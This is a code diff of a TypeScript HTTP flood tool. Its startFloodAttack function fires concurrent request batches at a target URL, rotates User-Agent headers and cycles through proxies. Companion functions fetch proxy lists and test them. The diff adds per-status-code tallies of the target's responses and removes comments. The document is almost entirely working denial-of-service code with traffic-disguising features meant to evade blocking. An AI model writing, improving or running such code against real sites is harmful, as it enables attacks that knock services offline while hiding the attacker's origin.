@@ -9,11 +9,12 @@ export interface FloodStats {
   successful: number;
   failed: number;
   error?: string;
+  statusCodeCounts?: Record<number, number>;
 }
 
 const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];
-const PROXY_TEST_URL = "https://www.google.com/generate_204"; // Lightweight URL for testing
-const PROXY_TEST_TIMEOUT_MS = 7000; // 7 seconds
+const PROXY_TEST_URL = "https://www.google.com/generate_204"; 
+const PROXY_TEST_TIMEOUT_MS = 7000; 
 const CONCURRENT_PROXY_CHECKS = 10;
 
 
@@ -66,14 +67,12 @@ export async function startFloodAttack(
 
   const baseFetchOptions: RequestInit = {
     method: method.toUpperCase(),
-    // Headers will be set per request to allow User-Agent rotation
     signal: AbortSignal.timeout(5000) 
   };
 
   if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
     baseFetchOptions.body = body;
     
-    // Set Content-Type only if not already provided in custom headers
     const hasContentType = Object.keys(parsedHeaders).some(key => key.toLowerCase() === 'content-type');
     if (!hasContentType) {
         try {
@@ -101,6 +100,7 @@ export async function startFloodAttack(
   let totalSent = 0;
   let successful = 0;
   let failed = 0;
+  const statusCodeCounts: Record<number, number> = {};
   const startTime = Date.now();
   const endTime = startTime + safeDuration * 1000;
 
@@ -119,7 +119,6 @@ export async function startFloodAttack(
         let currentFetchOptions = { ...baseFetchOptions };
         const currentHeaders = {...parsedHeaders};
 
-        // User-Agent rotation
         if (!customUserAgentProvided && USER_AGENTS.length > 0) {
             currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
         }
@@ -129,13 +128,12 @@ export async function startFloodAttack(
         if (parsedProxies.length > 0) {
           const proxyConfig = parsedProxies[totalSent % parsedProxies.length];
           try {
-            // HttpsProxyAgent expects the proxy string in host:port format,
-            // or user:pass@host:port. It handles http:// prefix internally if needed for CONNECT.
             const agent = new HttpsProxyAgent(proxyConfig); 
             currentFetchOptions.agent = agent as any; 
           } catch (e) {
             console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
             failed++;
+            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // -1 for proxy setup error
             totalSent++; 
             continue; 
           }
@@ -144,14 +142,22 @@ export async function startFloodAttack(
         requestsInBatch.push(
           fetch(targetUrl, currentFetchOptions) 
             .then(response => {
-              if (response.ok || (response.status >= 200 && response.status < 400)) {
+              const status = response.status;
+              statusCodeCounts[status] = (statusCodeCounts[status] || 0) + 1;
+              
+              if (response.status >= 200 && response.status < 400) { // Consider 2xx and 3xx as successful for high-level count
                 successful++;
               } else {
                 failed++;
               }
             })
-            .catch(() => {
+            .catch((e: any) => {
               failed++;
+              if (e.name === 'AbortError' || e.name === 'TimeoutError') {
+                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // 0 for timeouts/aborts
+              } else {
+                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // -1 for other network errors
+              }
             })
             .finally(() => {
               totalSent++;
@@ -173,12 +179,12 @@ export async function startFloodAttack(
     }
   } catch (e: any) {
     console.error("Flood attack error:", e);
-    return { totalSent, successful, failed, error: e.message || "An unexpected error occurred during the flood." };
+    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "An unexpected error occurred during the flood." };
   } finally {
-    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}`);
+    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}, Status Codes: ${JSON.stringify(statusCodeCounts)}`);
   }
 
-  return { totalSent, successful, failed };
+  return { totalSent, successful, failed, statusCodeCounts };
 }
 
 export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
@@ -204,14 +210,9 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
       return { error: "API returned an empty proxy list." };
     }
     
-    // Strip http(s):// schemes and trim lines
     const lines = text.trim().split('\n');
     const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, ''));
     
-    // Basic validation for stripped lines (optional, but good for user feedback if format is unexpected)
-    if (strippedLines.length === 0 || !strippedLines.some(line => /^\S+:\d+$/.test(line.trim()) || /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) )) {
-      // console.warn("Fetched proxy list, after stripping schemes, does not seem to contain valid IP:Port or Host:Port formats.", strippedLines.slice(0,5));
-    }
     return { proxies: strippedLines.join('\n') };
   } catch (e: any) {
     console.error("Error fetching proxies from API:", e);
@@ -234,7 +235,6 @@ export async function checkProxies(proxiesString: string): Promise<{
     return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
   }
 
-  // Expect proxies in host:port or user:pass@host:port format, without schemes.
   const proxyEntries = proxiesString.split('\n')
     .map(line => line.trim())
     .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); 
@@ -246,9 +246,9 @@ export async function checkProxies(proxiesString: string): Promise<{
   const liveProxiesArray: string[] = [];
   let deadCount = 0;
 
-  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { // proxyUrl is host:port or user:pass@host:port
+  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { 
     try {
-      const agent = new HttpsProxyAgent(proxyUrl); // HttpsProxyAgent can handle user:pass@host:port
+      const agent = new HttpsProxyAgent(proxyUrl); 
       const response = await fetch(PROXY_TEST_URL, {
         agent: agent as any,
         signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
@@ -256,7 +256,6 @@ export async function checkProxies(proxiesString: string): Promise<{
       });
       return response.status === 204 || response.status === 200;
     } catch (error: any) {
-      // console.warn(`Proxy ${proxyUrl} failed check:`, error.message);
       return false;
     }
   };
@@ -275,9 +274,6 @@ export async function checkProxies(proxiesString: string): Promise<{
           deadCount++;
         }
       } else {
-        // result.status === 'rejected' means checkSingleProxy threw an unhandled error,
-        // or the promise itself was rejected before checkSingleProxy completed.
-        // Treat as dead.
         deadCount++;
       }
     });
@@ -290,4 +286,3 @@ export async function checkProxies(proxiesString: string): Promise<{
     totalChecked: proxyEntries.length,
   };
 }
-
